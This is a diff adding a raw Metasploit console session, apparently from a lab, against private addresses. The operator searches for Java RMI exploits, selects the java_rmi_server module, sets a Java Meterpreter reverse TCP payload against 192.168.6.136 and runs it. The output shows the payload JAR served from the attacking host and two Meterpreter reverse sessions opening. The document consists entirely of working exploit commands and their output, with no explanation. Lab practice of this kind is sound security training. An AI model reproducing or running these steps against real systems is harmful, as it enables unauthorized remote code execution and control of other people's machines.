@@ -1,0 +1,94 @@
+ msfconsole -q
+msf6 > search java rmi exploit
+
+Matching Modules
+================
+
+   #   Name                                                             Disclosure Date  Rank       Check  Description
+   -   ----                                                             ---------------  ----       -----  -----------
+   0   exploit/multi/http/atlassian_crowd_pdkinstall_plugin_upload_rce  2019-05-22       excellent  Yes    Atlassian Crowd pdkinstall Unauthenticated Plugin Upload RCE
+   1   exploit/multi/http/crushftp_rce_cve_2023_43177                   2023-08-08       excellent  Yes    CrushFTP Unauthenticated RCE
+   2     \_ target: Java                                                .                .          .      .
+   3     \_ target: Linux Dropper                                       .                .          .      .
+   4     \_ target: Windows Dropper                                     .                .          .      .
+   5   exploit/multi/misc/java_jmx_server                               2013-05-22       excellent  Yes    Java JMX Server Insecure Configuration Java Code Execution
+   6   auxiliary/scanner/misc/java_jmx_server                           2013-05-22       normal     No     Java JMX Server Insecure Endpoint Code Execution Scanner
+   7   exploit/multi/misc/java_rmi_server                               2011-10-15       excellent  Yes    Java RMI Server Insecure Default Configuration Java Code Execution
+   8     \_ target: Generic (Java Payload)                              .                .          .      .
+   9     \_ target: Windows x86 (Native Payload)                        .                .          .      .
+   10    \_ target: Linux x86 (Native Payload)                          .                .          .      .
+   11    \_ target: Mac OS X PPC (Native Payload)                       .                .          .      .
+   12    \_ target: Mac OS X x86 (Native Payload)                       .                .          .      .
+   13  exploit/multi/browser/java_rmi_connection_impl                   2010-03-31       excellent  No     Java RMIConnectionImpl Deserialization Privilege Escalation
+   14  exploit/multi/browser/java_signed_applet                         1997-02-19       excellent  No     Java Signed Applet Social Engineering Code Execution
+   15    \_ target: Generic (Java Payload)                              .                .          .      .
+   16    \_ target: Windows x86 (Native Payload)                        .                .          .      .
+   17    \_ target: Linux x86 (Native Payload)                          .                .          .      .
+   18    \_ target: Mac OS X PPC (Native Payload)                       .                .          .      .
+   19    \_ target: Mac OS X x86 (Native Payload)                       .                .          .      .
+   20  exploit/multi/http/jenkins_metaprogramming                       2019-01-08       excellent  Yes    Jenkins ACL Bypass and Metaprogramming RCE
+   21    \_ target: Unix In-Memory                                      .                .          .      .
+   22    \_ target: Java Dropper                                        .                .          .      .
+   23  exploit/linux/misc/jenkins_java_deserialize                      2015-11-18       excellent  Yes    Jenkins CLI RMI Java Deserialization Vulnerability
+   24  exploit/linux/http/kibana_timelion_prototype_pollution_rce       2019-10-30       manual     Yes    Kibana Timelion Prototype Pollution RCE
+   25  exploit/multi/browser/firefox_xpi_bootstrapped_addon             2007-06-27       excellent  No     Mozilla Firefox Bootstrapped Addon Social Engineering Code Execution
+   26    \_ target: Universal (Javascript XPCOM Shell)                  .                .          .      .
+   27    \_ target: Native Payload                                      .                .          .      .
+   28  exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315       2023-05-26       excellent  Yes    Openfire authentication bypass with RCE plugin
+   29  exploit/multi/http/torchserver_cve_2023_43654                    2023-10-03       excellent  Yes    PyTorch Model Server Registration and Deserialization RCE
+   30  exploit/multi/http/totaljs_cms_widget_exec                       2019-08-30       excellent  Yes    Total.js CMS 12 Widget JavaScript Code Injection
+   31    \_ target: Total.js CMS on Linux                               .                .          .      .
+   32    \_ target: Total.js CMS on Mac                                 .                .          .      .
+   33  exploit/linux/local/vcenter_java_wrapper_vmon_priv_esc           2021-09-21       manual     Yes    VMware vCenter vScalation Priv Esc
+   34  exploit/multi/misc/vscode_ipynb_remote_dev_exec                  2022-11-22       excellent  Yes    VSCode ipynb Remote Development RCE
+   35    \_ target: Windows                                             .                .          .      .
+   36    \_ target: Linux File-Dropper                                  .                .          .      .
+
+
+Interact with a module by name or index. For example info 36, use 36 or use exploit/multi/misc/vscode_ipynb_remote_dev_exec
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux File-Dropper'
+
+msf6 > use 7
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/misc/java_rmi_server) > show payloads 
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/cmd/unix/bind_aws_instance_connect  .                normal  No     Unix SSH Shell, Bind Instance Connect (via AWS API)
+   1   payload/generic/custom                      .                normal  No     Custom Payload
+   2   payload/generic/shell_bind_aws_ssm          .                normal  No     Command Shell, Bind SSM (via AWS API)
+   3   payload/generic/shell_bind_tcp              .                normal  No     Generic Command Shell, Bind TCP Inline
+   4   payload/generic/shell_reverse_tcp           .                normal  No     Generic Command Shell, Reverse TCP Inline
+   5   payload/generic/ssh/interact                .                normal  No     Interact with Established SSH Connection
+   6   payload/java/jsp_shell_bind_tcp             .                normal  No     Java JSP Command Shell, Bind TCP Inline
+   7   payload/java/jsp_shell_reverse_tcp          .                normal  No     Java JSP Command Shell, Reverse TCP Inline
+   8   payload/java/meterpreter/bind_tcp           .                normal  No     Java Meterpreter, Java Bind TCP Stager
+   9   payload/java/meterpreter/reverse_http       .                normal  No     Java Meterpreter, Java Reverse HTTP Stager
+   10  payload/java/meterpreter/reverse_https      .                normal  No     Java Meterpreter, Java Reverse HTTPS Stager
+   11  payload/java/meterpreter/reverse_tcp        .                normal  No     Java Meterpreter, Java Reverse TCP Stager
+   12  payload/java/shell/bind_tcp                 .                normal  No     Command Shell, Java Bind TCP Stager
+   13  payload/java/shell/reverse_tcp              .                normal  No     Command Shell, Java Reverse TCP Stager
+   14  payload/java/shell_reverse_tcp              .                normal  No     Java Command Shell, Reverse TCP Inline
+   15  payload/multi/meterpreter/reverse_http      .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
+   16  payload/multi/meterpreter/reverse_https     .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
+
+msf6 exploit(multi/misc/java_rmi_server) > set payload java/meterpreter/reverse_tcp
+payload => java/meterpreter/reverse_tcp
+msf6 exploit(multi/misc/java_rmi_server) > set rhosts 192.168.6.136
+rhosts => 192.168.6.136
+msf6 exploit(multi/misc/java_rmi_server) > run
+[*] Started reverse TCP handler on 192.168.6.137:4444 
+[*] 192.168.6.136:1099 - Using URL: http://192.168.6.137:8080/oO5KEr9
+[*] 192.168.6.136:1099 - Server started.
+[*] 192.168.6.136:1099 - Sending RMI Header...
+[*] 192.168.6.136:1099 - Sending RMI Call...
+[*] 192.168.6.136:1099 - Replied to request for payload JAR
+[*] Sending stage (58073 bytes) to 192.168.6.136
+[*] Meterpreter session 1 opened (192.168.6.137:4444 -> 192.168.6.136:37675) at 2025-11-13 22:53:39 +0200
+[*] Sending stage (58073 bytes) to 192.168.6.136
+
+meterpreter > [*] Meterpreter session 2 opened (192.168.6.137:4444 -> 192.168.6.136:43139) at 2025-11-13 22:53:40 +0200
+
